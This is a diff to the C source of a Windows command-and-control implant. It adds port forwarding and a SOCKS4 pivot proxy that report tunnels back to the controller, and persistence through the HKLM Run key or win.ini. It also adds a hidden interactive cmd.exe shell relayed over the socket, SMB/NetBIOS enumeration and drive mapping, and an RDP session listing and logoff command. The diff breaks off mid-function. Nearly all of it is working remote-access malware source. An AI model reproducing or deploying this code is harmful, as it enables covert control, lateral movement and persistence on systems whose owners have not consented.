@@ -161,6 +161,24 @@ static int   t_dec_r   = 0;
 static int   t_dec_len = 0;
 
 /* -----------------------------------------------------------------------
+ * Portfwd / SOCKS4 relay structures
+ * ----------------------------------------------------------------------- */
+#define MAX_RELAYS  8
+
+typedef struct {
+    HANDLE thread;
+    int    active;
+    int    type;          /* 1=portfwd, 2=socks4 */
+    int    lport;
+    char   rhost[256];
+    int    rport;
+    SOCKET listen_sock;
+    SOCKET c2_sock;       /* back-channel to report new connections */
+} RelaySlot;
+
+static RelaySlot g_relays[MAX_RELAYS];
+
+/* -----------------------------------------------------------------------
  * ToolHelp32 types (inline)
  * ----------------------------------------------------------------------- */
 #define TC_TH32CS_SNAPPROCESS 0x00000002UL
@@ -810,6 +828,801 @@ static int exec_command(SOCKET s, const char *cmd, const char *shell)
 }
 
 /* -----------------------------------------------------------------------
+ * Portfwd: bidirectional relay between two sockets (runs in thread)
+ * ----------------------------------------------------------------------- */
+typedef struct { SOCKET a; SOCKET b; } RelayCTX;
+
+static DWORD WINAPI relay_thread(LPVOID arg)
+{
+    RelayCTX *ctx = (RelayCTX *)arg;
+    SOCKET a = ctx->a, b = ctx->b;
+    char buf[4096];
+    free(ctx);
+
+    for (;;) {
+        fd_set rset; struct timeval tv;
+        int n;
+        FD_ZERO(&rset); FD_SET(a, &rset); FD_SET(b, &rset);
+        tv.tv_sec = 0; tv.tv_usec = 20000;
+        if (select(0, &rset, NULL, NULL, &tv) <= 0) continue;
+        if (FD_ISSET(a, &rset)) {
+            n = recv(a, buf, sizeof(buf), 0); if (n <= 0) break;
+            if (send(b, buf, n, 0) == SOCKET_ERROR) break;
+        }
+        if (FD_ISSET(b, &rset)) {
+            n = recv(b, buf, sizeof(buf), 0); if (n <= 0) break;
+            if (send(a, buf, n, 0) == SOCKET_ERROR) break;
+        }
+    }
+    closesocket(a); closesocket(b);
+    return 0;
+}
+
+/* Accept loop for portfwd (runs in thread) */
+static DWORD WINAPI portfwd_accept_thread(LPVOID arg)
+{
+    RelaySlot *slot = (RelaySlot *)arg;
+    SOCKET cs;
+
+    while (slot->active) {
+        struct sockaddr_in peer; int plen = sizeof(peer);
+        cs = accept(slot->listen_sock, (struct sockaddr *)&peer, &plen);
+        if (cs == INVALID_SOCKET) break;
+        {
+            /* Connect to remote target */
+            SOCKET rs;
+            struct sockaddr_in raddr;
+            struct hostent *he;
+            char info[256];
+
+            rs = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (rs == INVALID_SOCKET) { closesocket(cs); continue; }
+
+            memset(&raddr, 0, sizeof(raddr));
+            raddr.sin_family = AF_INET;
+            raddr.sin_port   = htons((unsigned short)slot->rport);
+            {
+                unsigned long ip = inet_addr(slot->rhost);
+                if (ip != INADDR_NONE) raddr.sin_addr.s_addr = ip;
+                else {
+                    he = gethostbyname(slot->rhost);
+                    if (!he) { closesocket(cs); closesocket(rs); continue; }
+                    memcpy(&raddr.sin_addr, he->h_addr, 4);
+                }
+            }
+            if (connect(rs, (struct sockaddr *)&raddr, sizeof(raddr)) != 0) {
+                closesocket(cs); closesocket(rs); continue;
+            }
+
+            /* Report new tunnel to Joshua */
+            if (slot->c2_sock != INVALID_SOCKET) {
+                wsprintf(info, "RELAY %d:%d CONNECT %s:%s:%d\r\n",
+                         slot->lport,
+                         (int)peer.sin_port,
+                         inet_ntoa(peer.sin_addr),
+                         slot->rhost, slot->rport);
+                send(slot->c2_sock, info, lstrlen(info), 0);
+            }
+
+            /* Spawn relay thread */
+            {
+                RelayCTX *ctx = (RelayCTX *)malloc(sizeof(RelayCTX));
+                if (ctx) {
+                    HANDLE t;
+                    ctx->a = cs; ctx->b = rs;
+                    t = CreateThread(NULL, 0, relay_thread, ctx, 0, NULL);
+                    if (t) CloseHandle(t);
+                    else { free(ctx); closesocket(cs); closesocket(rs); }
+                } else { closesocket(cs); closesocket(rs); }
+            }
+        }
+    }
+    closesocket(slot->listen_sock);
+    slot->listen_sock = INVALID_SOCKET;
+    slot->active = 0;
+    return 0;
+}
+
+/* cmd_portfwd: portfwd <lport> <rhost> <rport> */
+static int cmd_portfwd(SOCKET s, const char *args)
+{
+    int lport, rport, i;
+    char rhost[256];
+    RelaySlot *slot = NULL;
+    SOCKET ls;
+    struct sockaddr_in addr;
+    char info[256];
+
+    if (sscanf(args, "%d %255s %d", &lport, rhost, &rport) != 3) {
+        send_str(s, "portfwd: usage: portfwd <lport> <rhost> <rport>\r\n");
+        return send_done(s);
+    }
+    if (lport < 1 || lport > 65535 || rport < 1 || rport > 65535) {
+        send_str(s, "portfwd: invalid port\r\n"); return send_done(s);
+    }
+
+    for (i = 0; i < MAX_RELAYS; i++) {
+        if (!g_relays[i].active) { slot = &g_relays[i]; break; }
+    }
+    if (!slot) { send_str(s, "portfwd: too many active relays\r\n"); return send_done(s); }
+
+    ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (ls == INVALID_SOCKET) { send_str(s, "portfwd: socket failed\r\n"); return send_done(s); }
+    { int r = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char *)&r, sizeof(r)); }
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons((unsigned short)lport);
+    if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(ls, 8) != 0) {
+        closesocket(ls);
+        send_str(s, "portfwd: bind/listen failed\r\n"); return send_done(s);
+    }
+
+    memset(slot, 0, sizeof(*slot));
+    slot->type = 1; slot->active = 1;
+    slot->lport = lport; slot->rport = rport;
+    lstrcpyn(slot->rhost, rhost, sizeof(slot->rhost));
+    slot->listen_sock = ls;
+    slot->c2_sock = s;
+
+    slot->thread = CreateThread(NULL, 0, portfwd_accept_thread, slot, 0, NULL);
+    if (!slot->thread) {
+        closesocket(ls); slot->active = 0;
+        send_str(s, "portfwd: CreateThread failed\r\n"); return send_done(s);
+    }
+    CloseHandle(slot->thread);
+
+    wsprintf(info, "portfwd: listening on :%d -> %s:%d\r\n", lport, rhost, rport);
+    send_str(s, info);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * SOCKS4: minimal server (runs in thread per connection)
+ * ----------------------------------------------------------------------- */
+
+typedef struct { SOCKET client; SOCKET c2; } Socks4CTX;
+
+#pragma pack(1)
+typedef struct { BYTE vn; BYTE cd; WORD dstport; DWORD dstip; } Socks4Req;
+#pragma pack()
+
+static DWORD WINAPI socks4_conn_thread(LPVOID arg)
+{
+    Socks4CTX *ctx = (Socks4CTX *)arg;
+    SOCKET cs = ctx->client;
+    SOCKET rs;
+    Socks4Req req;
+    struct sockaddr_in dst;
+    BYTE  reply[8];
+    char  userid[256];
+    int   n, uid_len = 0;
+    char  c;
+    free(ctx);
+
+    /* Read SOCKS4 request header */
+    n = recv(cs, (char *)&req, sizeof(req), MSG_WAITALL);
+    if (n != sizeof(req)) goto fail;
+
+    /* Read NUL-terminated user ID */
+    while (uid_len < 255) {
+        if (recv(cs, &c, 1, 0) != 1) goto fail;
+        if (c == '\0') break;
+        userid[uid_len++] = c;
+    }
+    userid[uid_len] = '\0';
+
+    if (req.vn != 4 || req.cd != 1) goto fail;
+
+    /* Connect to requested destination */
+    rs = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (rs == INVALID_SOCKET) goto fail;
+
+    memset(&dst, 0, sizeof(dst));
+    dst.sin_family = AF_INET;
+    dst.sin_port   = req.dstport;           /* already network byte order */
+    dst.sin_addr.s_addr = req.dstip;
+
+    if (connect(rs, (struct sockaddr *)&dst, sizeof(dst)) != 0) {
+        /* Request rejected */
+        memset(reply, 0, 8); reply[1] = 91;  /* request rejected */
+        send(cs, (char *)reply, 8, 0);
+        closesocket(rs); closesocket(cs); return 0;
+    }
+
+    /* Request granted */
+    memset(reply, 0, 8); reply[1] = 90;
+    send(cs, (char *)reply, 8, 0);
+
+    /* Relay */
+    {
+        RelayCTX *rc = (RelayCTX *)malloc(sizeof(RelayCTX));
+        if (rc) {
+            HANDLE t;
+            rc->a = cs; rc->b = rs;
+            t = CreateThread(NULL, 0, relay_thread, rc, 0, NULL);
+            if (t) { CloseHandle(t); return 0; }
+            free(rc);
+        }
+    }
+    closesocket(rs);
+fail:
+    closesocket(cs);
+    return 0;
+}
+
+/* Accept loop for SOCKS4 (runs in thread) */
+static DWORD WINAPI socks4_accept_thread(LPVOID arg)
+{
+    RelaySlot *slot = (RelaySlot *)arg;
+    SOCKET cs;
+
+    while (slot->active) {
+        struct sockaddr_in peer; int plen = sizeof(peer);
+        cs = accept(slot->listen_sock, (struct sockaddr *)&peer, &plen);
+        if (cs == INVALID_SOCKET) break;
+        {
+            Socks4CTX *ctx = (Socks4CTX *)malloc(sizeof(Socks4CTX));
+            if (ctx) {
+                HANDLE t;
+                ctx->client = cs; ctx->c2 = slot->c2_sock;
+                t = CreateThread(NULL, 0, socks4_conn_thread, ctx, 0, NULL);
+                if (t) CloseHandle(t);
+                else { free(ctx); closesocket(cs); }
+            } else { closesocket(cs); }
+        }
+    }
+    closesocket(slot->listen_sock);
+    slot->listen_sock = INVALID_SOCKET;
+    slot->active = 0;
+    return 0;
+}
+
+static int cmd_socks4(SOCKET s, const char *args)
+{
+    int lport, i;
+    RelaySlot *slot = NULL;
+    SOCKET ls;
+    struct sockaddr_in addr;
+    char info[128];
+
+    lport = atoi(args);
+    if (lport < 1 || lport > 65535) {
+        send_str(s, "socks4: usage: socks4 <lport>\r\n"); return send_done(s);
+    }
+
+    for (i = 0; i < MAX_RELAYS; i++) {
+        if (!g_relays[i].active) { slot = &g_relays[i]; break; }
+    }
+    if (!slot) { send_str(s, "socks4: too many active relays\r\n"); return send_done(s); }
+
+    ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (ls == INVALID_SOCKET) { send_str(s, "socks4: socket failed\r\n"); return send_done(s); }
+    { int r = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char *)&r, sizeof(r)); }
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons((unsigned short)lport);
+    if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(ls, 16) != 0) {
+        closesocket(ls); send_str(s, "socks4: bind/listen failed\r\n"); return send_done(s);
+    }
+
+    memset(slot, 0, sizeof(*slot));
+    slot->type = 2; slot->active = 1;
+    slot->lport = lport; slot->listen_sock = ls; slot->c2_sock = s;
+
+    slot->thread = CreateThread(NULL, 0, socks4_accept_thread, slot, 0, NULL);
+    if (!slot->thread) {
+        closesocket(ls); slot->active = 0;
+        send_str(s, "socks4: CreateThread failed\r\n"); return send_done(s);
+    }
+    CloseHandle(slot->thread);
+
+    wsprintf(info, "socks4: proxy listening on :%d\r\n", lport);
+    send_str(s, info);
+    return send_done(s);
+}
+
+/* stop all relays */
+static int cmd_relay_stop(SOCKET s, const char *args)
+{
+    int i, stopped = 0;
+    char info[128];
+    (void)args;
+    for (i = 0; i < MAX_RELAYS; i++) {
+        if (g_relays[i].active) {
+            g_relays[i].active = 0;
+            if (g_relays[i].listen_sock != INVALID_SOCKET) {
+                closesocket(g_relays[i].listen_sock);
+                g_relays[i].listen_sock = INVALID_SOCKET;
+            }
+            stopped++;
+        }
+    }
+    wsprintf(info, "relay: stopped %d relay(s)\r\n", stopped);
+    send_str(s, info);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cwd / cd / cat / less
+ * ----------------------------------------------------------------------- */
+static int cmd_cwd(SOCKET s)
+{
+    char buf[MAX_PATH + 4];
+    GetCurrentDirectory(MAX_PATH, buf);
+    lstrcat(buf, "\r\n");
+    send_str(s, buf);
+    return send_done(s);
+}
+
+static int cmd_cd(SOCKET s, const char *path)
+{
+    char msg[MAX_PATH + 40];
+    if (!path || !path[0]) return cmd_cwd(s);
+    if (!SetCurrentDirectory(path)) {
+        wsprintf(msg, "cd: cannot change to '%s' (%lu)\r\n", path, GetLastError());
+        send_str(s, msg); return send_done(s);
+    }
+    return cmd_cwd(s);  /* confirm new directory */
+}
+
+#define CAT_MAX_BINARY_CHECK 512
+
+static int cmd_cat(SOCKET s, const char *path)
+{
+    FILE *f;
+    char  buf[4096];
+    int   n;
+
+    if (!path || !path[0]) { send_str(s, "cat: no path\r\n"); return send_done(s); }
+    f = fopen(path, "rb");
+    if (!f) { char m[MAX_PATH+32]; wsprintf(m,"cat: cannot open '%s' (%lu)\r\n",path,GetLastError()); send_str(s,m); return send_done(s); }
+
+    /* Quick binary check on first 512 bytes */
+    { int probe = (int)fread(buf, 1, CAT_MAX_BINARY_CHECK, f);
+      int bi, is_bin = 0;
+      for (bi = 0; bi < probe; bi++) {
+          unsigned char c = (unsigned char)buf[bi];
+          if (c < 8 || (c > 13 && c < 32 && c != 27)) { is_bin = 1; break; }
+      }
+      if (is_bin) {
+          send_str(s, "cat: file appears binary — use 'get' to download\r\n");
+          fclose(f); return send_done(s);
+      }
+      if (probe > 0) send_all(s, buf, probe); }
+
+    while ((n = (int)fread(buf, 1, sizeof(buf), f)) > 0)
+        send_all(s, buf, n);
+    fclose(f);
+    if (buf[0] != '\n') send_str(s, "\r\n");
+    return send_done(s);
+}
+
+/* less: paged display — protocol uses <<<PAGE>>> marker */
+#define LESS_PAGE 40   /* lines per page */
+
+static int cmd_less(SOCKET s, const char *path)
+{
+    FILE *f;
+    char  line[1024];
+    char  cmd[64];
+    int   line_count = 0;
+
+    if (!path || !path[0]) { send_str(s, "less: no path\r\n"); return send_done(s); }
+    f = fopen(path, "r");
+    if (!f) { char m[MAX_PATH+32]; wsprintf(m,"less: cannot open '%s' (%lu)\r\n",path,GetLastError()); send_str(s,m); return send_done(s); }
+
+    while (fgets(line, sizeof(line), f)) {
+        send_str(s, line);
+        line_count++;
+        if (line_count >= LESS_PAGE) {
+            send_str(s, "<<<PAGE>>>\r\n");
+            line_count = 0;
+            {
+                int n = recv_line(s, cmd, sizeof(cmd));
+                if (n < 0) goto done;
+                if (nc_nicmp(cmd, "QUITPAGE", 8) == 0) goto done;
+                /* NEXTPAGE: continue */
+            }
+        }
+    }
+done:
+    fclose(f);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * persist: add this implant to the platform's autostart mechanism
+ * ----------------------------------------------------------------------- */
+static int cmd_persist(SOCKET s, const char *args)
+{
+    char   self_path[MAX_PATH];
+    char   msg[MAX_PATH + 80];
+    BOOL   remove_mode = (args && nc_nicmp(args, "remove", 6) == 0);
+    LONG   ret;
+    HKEY   hkey;
+    BOOL   is_nt;
+    const char *value_name = "AeldreC2Tank";
+
+    GetModuleFileName(NULL, self_path, MAX_PATH);
+
+    {   OSVERSIONINFO osv; memset(&osv,0,sizeof(osv));
+        osv.dwOSVersionInfoSize=sizeof(osv); GetVersionEx(&osv);
+        is_nt = (osv.dwPlatformId == VER_PLATFORM_WIN32_NT); }
+
+    if (is_nt || GetVersion() < 0x80000000UL) {
+        /* NT or Win95/98: use HKLM\...\Run */
+        const char *regpath = is_nt
+            ? "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Run"
+            : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+        if (remove_mode) {
+            ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, KEY_SET_VALUE, &hkey);
+            if (ret == ERROR_SUCCESS) { RegDeleteValue(hkey, value_name); RegCloseKey(hkey); }
+            send_str(s, "persist: autorun entry removed\r\n");
+        } else {
+            ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, NULL, 0,
+                                 KEY_SET_VALUE, NULL, &hkey, NULL);
+            if (ret == ERROR_SUCCESS) {
+                RegSetValueEx(hkey, value_name, 0, REG_SZ,
+                              (BYTE *)self_path, (DWORD)lstrlen(self_path)+1);
+                RegCloseKey(hkey);
+                wsprintf(msg, "persist: added to %s\\%s\r\n", regpath, value_name);
+                send_str(s, msg);
+            } else {
+                wsprintf(msg, "persist: RegCreateKeyEx failed (%ld) — try as admin\r\n", ret);
+                send_str(s, msg);
+            }
+        }
+    } else {
+        /* WFW / Win 3.11: use win.ini [windows] load= */
+        if (remove_mode) {
+            char existing[2048] = "", newval[2048] = "", *p;
+            GetProfileString("windows", "load", "", existing, sizeof(existing));
+            p = existing;
+            while (*p) {
+                char *start = p;
+                while (*p && *p != ' ') p++;
+                if (*p) *p++ = '\0';
+                if (lstrcmpi(start, self_path) != 0) {
+                    if (newval[0]) lstrcat(newval, " ");
+                    lstrcat(newval, start);
+                }
+            }
+            WriteProfileString("windows", "load", newval);
+            send_str(s, "persist: removed from win.ini [windows] load=\r\n");
+        } else {
+            char existing[2048] = "", newval[2048];
+            GetProfileString("windows", "load", "", existing, sizeof(existing));
+            if (existing[0]) wsprintf(newval, "%s %s", existing, self_path);
+            else             lstrcpyn(newval, self_path, sizeof(newval)-1);
+            WriteProfileString("windows", "load", newval);
+            send_str(s, "persist: added to win.ini [windows] load=\r\n");
+        }
+    }
+
+    wsprintf(msg, "persist: path = %s\r\n", self_path);
+    send_str(s, msg);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * Interactive shell — bidirectional pipe to cmd.exe / COMMAND.COM
+ *
+ * While in shell mode:
+ *   ~.           (on its own line) exits shell and returns to command mode
+ *   !sysinfo     routes to the tank's sysinfo command, not the shell
+ *   !ps / !ls    similarly for any tank command
+ *   everything else goes straight to cmd.exe stdin
+ * ----------------------------------------------------------------------- */
+static int cmd_shell(SOCKET s, const char *shell_path)
+{
+    SECURITY_ATTRIBUTES sa;
+    STARTUPINFO         si;
+    PROCESS_INFORMATION pi;
+    HANDLE hRead = INVALID_HANDLE_VALUE, hWrite = INVALID_HANDLE_VALUE;
+    HANDLE hProcIn = INVALID_HANDLE_VALUE;
+    char   cmdline[MAX_PATH + 8];
+    char   outbuf[4096], inbuf[2048];
+    DWORD  nread, avail;
+    BOOL   alive = TRUE;
+
+    send_str(s,
+        "== Yori Shell ==  type ~. alone to exit  |  prefix !cmd for tank commands\r\n");
+    {
+        char compname[MAX_PATH]; DWORD n = MAX_PATH;
+        GetComputerName(compname, &n);
+        send_str(s, "Host: "); send_str(s, compname); send_str(s, "\r\n");
+    }
+
+    memset(&sa,0,sizeof(sa)); sa.nLength=sizeof(sa); sa.bInheritHandle=TRUE;
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+        send_str(s, "shell: CreatePipe failed\r\n"); return send_done(s);
+    }
+    if (!CreatePipe(&hProcIn, NULL, &sa, 0)) {
+        /* Create a writable end for shell stdin — use temp name */
+        HANDLE hTmpR, hTmpW;
+        CreatePipe(&hTmpR, &hTmpW, &sa, 0);
+        CloseHandle(hTmpR);
+        hProcIn = hTmpW;
+    }
+
+    /* Proper piped shell stdin */
+    {
+        HANDLE hStdinR, hStdinW;
+        CloseHandle(hProcIn);
+        CreatePipe(&hStdinR, &hStdinW, &sa, 0);
+        SetHandleInformation(hStdinW, HANDLE_FLAG_INHERIT, 0);
+        hProcIn = hStdinW;
+
+        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+        wsprintf(cmdline, "%s", shell_path);
+        memset(&si,0,sizeof(si)); si.cb=sizeof(si);
+        si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
+        si.hStdInput=hStdinR; si.hStdOutput=hWrite; si.hStdError=hWrite;
+        memset(&pi,0,sizeof(pi));
+
+        if (!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            send_str(s, "shell: spawn failed\r\n");
+            CloseHandle(hRead); CloseHandle(hWrite); CloseHandle(hStdinR); CloseHandle(hStdinW);
+            return send_done(s);
+        }
+        CloseHandle(hWrite); CloseHandle(hStdinR);
+        CloseHandle(pi.hThread);
+    }
+
+    /* Relay loop */
+    while (alive) {
+        int got_input = 0;
+
+        /* Check socket for operator input */
+        {
+            fd_set rset; struct timeval tv;
+            FD_ZERO(&rset); FD_SET(s, &rset);
+            tv.tv_sec=0; tv.tv_usec=10000;
+            if (select(0,&rset,NULL,NULL,&tv)>0 && FD_ISSET(s,&rset)) {
+                int n = recv(s, inbuf, sizeof(inbuf)-1, 0);
+                if (n <= 0) { alive = FALSE; break; }
+                inbuf[n] = '\0';
+                /* Exit sequence */
+                if (strcmp(inbuf,"~.\r\n")==0 || strcmp(inbuf,"~.\n")==0) break;
+                /* Tank command prefix */
+                if (inbuf[0] == '!') {
+                    /* strip newline, strip leading ! */
+                    char tcmd[2048];
+                    lstrcpyn(tcmd, inbuf+1, sizeof(tcmd));
+                    { int l=lstrlen(tcmd); while(l>0&&(tcmd[l-1]=='\r'||tcmd[l-1]=='\n')) tcmd[--l]='\0'; }
+                    if (tcmd[0]) {
+                        /* Route to tank command dispatcher — same as run_session */
+                        if      (cmd_is(tcmd,"sysinfo"))   cmd_sysinfo(s);
+                        else if (cmd_is(tcmd,"ps"))         cmd_ps(s);
+                        else if (cmd_is(tcmd,"ls"))         cmd_ls(s, cmd_arg(tcmd,"ls"));
+                        else if (cmd_is(tcmd,"cwd"))        cmd_cwd(s);
+                        else if (cmd_is(tcmd,"smb"))        cmd_smb(s, cmd_arg(tcmd,"smb"));
+                        else if (cmd_is(tcmd,"rdp"))        cmd_rdp(s, cmd_arg(tcmd,"rdp"));
+                        else if (cmd_is(tcmd,"screenshot")) cmd_screenshot(s);
+                        else { send_str(s,"!: unknown tank command\r\n"); send_done(s); }
+                    }
+                    got_input = 1;
+                } else {
+                    /* Send to shell stdin */
+                    WriteFile(hProcIn, inbuf, (DWORD)n, &nread, NULL);
+                    got_input = 1;
+                }
+            }
+        }
+
+        /* Read shell stdout */
+        avail = 0;
+        if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+            DWORD want = avail > sizeof(outbuf) ? sizeof(outbuf) : avail;
+            if (ReadFile(hRead, outbuf, want, &nread, NULL) && nread > 0)
+                send_all(s, outbuf, (int)nread);
+        }
+
+        if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) {
+            /* Drain remaining output */
+            while (PeekNamedPipe(hRead,NULL,0,NULL,&avail,NULL) && avail>0) {
+                DWORD want=avail>sizeof(outbuf)?sizeof(outbuf):avail;
+                if (ReadFile(hRead,outbuf,want,&nread,NULL)&&nread>0) send_all(s,outbuf,(int)nread);
+                else break;
+            }
+            send_str(s, "\r\n[shell exited]\r\n");
+            alive = FALSE;
+        }
+
+        if (!got_input && avail == 0) Sleep(5);
+    }
+
+    CloseHandle(hRead);
+    CloseHandle(hProcIn);
+    if (alive) CloseHandle(pi.hProcess);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * SMB subcommand: wraps net.exe / nbtstat / cacls with friendly help
+ * ----------------------------------------------------------------------- */
+static int cmd_smb(SOCKET s, const char *args)
+{
+    char shell[MAX_PATH];
+    char cmdline[512];
+    const char *sub, *rest;
+
+    find_shell(shell, MAX_PATH);
+
+    if (!args || !args[0]) {
+        send_str(s,
+            "SMB / NetBIOS subcommands:\r\n"
+            "  smb shares  [\\\\host]        Local or remote share list (net share)\r\n"
+            "  smb view    [\\\\host]        Browse remote shares (net view)\r\n"
+            "  smb users   [\\\\host]        Local user accounts (net user)\r\n"
+            "  smb groups  [\\\\host]        Local groups (net localgroup)\r\n"
+            "  smb admins  [\\\\host]        Members of Administrators\r\n"
+            "  smb acl     <path>           File/directory ACLs (cacls)\r\n"
+            "  smb stat    <ip>             NetBIOS name table (nbtstat -A)\r\n"
+            "  smb names                   Local NetBIOS names (nbtstat -n)\r\n"
+            "  smb sessions                Active SMB sessions (net session)\r\n"
+            "  smb domain                  Domain/workgroup info (net config ws)\r\n"
+            "  smb map     \\\\host\\share [u] [p]   Map drive (net use)\r\n"
+            "  smb unmap   <drive|*>        Disconnect mapped drive\r\n"
+            "\r\n");
+        return send_done(s);
+    }
+
+    sub  = args;
+    rest = strchr(sub, ' ');
+    if (rest) rest++; else rest = "";
+
+    if (cmd_is(sub, "shares")) {
+        if (rest[0]) wsprintf(cmdline, "net share %s", rest);
+        else         lstrcpy(cmdline, "net share");
+    } else if (cmd_is(sub, "view")) {
+        if (rest[0]) wsprintf(cmdline, "net view %s", rest);
+        else         lstrcpy(cmdline, "net view");
+    } else if (cmd_is(sub, "users")) {
+        if (rest[0]) wsprintf(cmdline, "net user /domain %s", rest);
+        else         lstrcpy(cmdline, "net user");
+    } else if (cmd_is(sub, "groups")) {
+        if (rest[0]) wsprintf(cmdline, "net localgroup %s", rest);
+        else         lstrcpy(cmdline, "net localgroup");
+    } else if (cmd_is(sub, "admins")) {
+        if (rest[0]) wsprintf(cmdline, "net localgroup Administrators %s", rest);
+        else         lstrcpy(cmdline, "net localgroup Administrators");
+    } else if (cmd_is(sub, "acl")) {
+        if (!rest[0]) { send_str(s, "smb acl: need <path>\r\n"); return send_done(s); }
+        wsprintf(cmdline, "cacls \"%s\"", rest);
+    } else if (cmd_is(sub, "stat")) {
+        char ip[64]; char *sp;
+        if (!rest[0]) { send_str(s, "smb stat: need <ip>\r\n"); return send_done(s); }
+        lstrcpyn(ip, rest, sizeof(ip));
+        /* strip \\ prefix */
+        sp = ip; while (*sp == '\\') sp++;
+        wsprintf(cmdline, "nbtstat -A %s", sp);
+    } else if (cmd_is(sub, "names")) {
+        lstrcpy(cmdline, "nbtstat -n");
+    } else if (cmd_is(sub, "sessions")) {
+        lstrcpy(cmdline, "net session");
+    } else if (cmd_is(sub, "domain")) {
+        lstrcpy(cmdline, "net config workstation");
+    } else if (cmd_is(sub, "map")) {
+        if (!rest[0]) { send_str(s, "smb map: need \\\\host\\share [user] [pass]\r\n"); return send_done(s); }
+        wsprintf(cmdline, "net use * %s", rest);
+    } else if (cmd_is(sub, "unmap")) {
+        if (!rest[0]) rest = "*";
+        wsprintf(cmdline, "net use %s /delete", rest);
+    } else {
+        send_str(s, "smb: unknown subcommand — type 'smb' alone for help\r\n");
+        return send_done(s);
+    }
+
+    return exec_command(s, cmdline, shell);
+}
+
+/* -----------------------------------------------------------------------
+ * RDP subcommand: Terminal Services session enumeration + control
+ * NOTE: RDP exists on NT 4.0 Terminal Server Edition (1998) and later.
+ *       NT 3.x has RAS (modem dial-in) but not RDP.  We check gracefully.
+ * ----------------------------------------------------------------------- */
+
+#pragma pack(1)
+typedef struct { DWORD SessionId; LPSTR pWinStationName; int State; } WTS_INFO;
+#pragma pack()
+typedef BOOL (WINAPI *PFN_WTSEnum)(HANDLE, DWORD, DWORD, WTS_INFO **, DWORD *);
+typedef BOOL (WINAPI *PFN_WTSLogoff)(HANDLE, DWORD, BOOL);
+typedef VOID (WINAPI *PFN_WTSFree)(PVOID);
+
+static const char *wts_state_str(int st)
+{
+    static const char *s[] = {
+        "Active","Connected","ConnectQuery","Shadow",
+        "Disconnected","Idle","Listen","Reset","Down","Init"
+    };
+    return (st >= 0 && st <= 9) ? s[st] : "?";
+}
+
+static int cmd_rdp(SOCKET s, const char *args)
+{
+    HMODULE         hWts;
+    PFN_WTSEnum     pfnEnum;
+    PFN_WTSLogoff   pfnLogoff;
+    PFN_WTSFree     pfnFree;
+    char            line[256];
+
+    if (!args || !args[0]) {
+        send_str(s,
+            "RDP/Terminal Services subcommands:\r\n"
+            "  rdp sessions          List TS/RDP sessions (NT 4 TSE / Win2000+)\r\n"
+            "  rdp logoff <id>       Log off session by numeric ID\r\n"
+            "Note: RDP requires NT 4.0 Terminal Server Edition or later.\r\n"
+            "      NT 3.x has RAS (modem dial-in), not RDP.\r\n\r\n");
+        return send_done(s);
+    }
+
+    hWts = LoadLibrary("wtsapi32.dll");
+    if (!hWts) {
+        send_str(s,
+            "rdp: wtsapi32.dll not found.\r\n"
+            "Terminal Services requires NT 4.0 Terminal Server Edition or Windows 2000+.\r\n"
+            "(This system has NT 3.x / Windows 95 / bare NT 4.0 — no RDP server.)\r\n");
+        return send_done(s);
+    }
+
+    pfnEnum   = (PFN_WTSEnum)  GetProcAddress(hWts, "WTSEnumerateSessionsA");
+    pfnLogoff = (PFN_WTSLogoff)GetProcAddress(hWts, "WTSLogoffSession");
+    pfnFree   = (PFN_WTSFree)  GetProcAddress(hWts, "WTSFreeMemory");
+
+    if (!pfnEnum || !pfnFree) {
+        FreeLibrary(hWts);
+        send_str(s, "rdp: WTSEnumerateSessions not available on this system.\r\n");
+        return send_done(s);
+    }
+
+    if (cmd_is(args, "sessions")) {
+        WTS_INFO *sessions = NULL;
+        DWORD     count    = 0;
+        if (pfnEnum((HANDLE)NULL /*WTS_CURRENT_SERVER_HANDLE=NULL*/, 0, 1,
+                    &sessions, &count)) {
+            DWORD i;
+            send_str(s, "  ID    State           WinStation\r\n");
+            send_str(s, "  ----  --------        ----------\r\n");
+            for (i = 0; i < count; i++) {
+                wsprintf(line, "  %-5lu %-16s  %s\r\n",
+                         sessions[i].SessionId,
+                         wts_state_str(sessions[i].State),
+                         sessions[i].pWinStationName
+                             ? sessions[i].pWinStationName : "");
+                send_str(s, line);
+            }
+            wsprintf(line, "\r\n%lu session(s).\r\n", count);
+            send_str(s, line);
+            pfnFree(sessions);
+        } else {
+            wsprintf(line, "rdp: WTSEnumerateSessionsA failed (%lu)\r\n", GetLastError());
+            send_str(s, line);
+        }
+    } else if (cmd_is(args, "logoff")) {
+        const char *idstr = cmd_arg(args, "logoff");
+        DWORD id = (DWORD)atol(idstr);
+        if (!idstr[0]) {
+            send_str(s, "rdp logoff: need <session_id>\r\n");
+        } else if (pfnLogoff && pfnLogoff((HANDLE)NULL, id, FALSE)) {
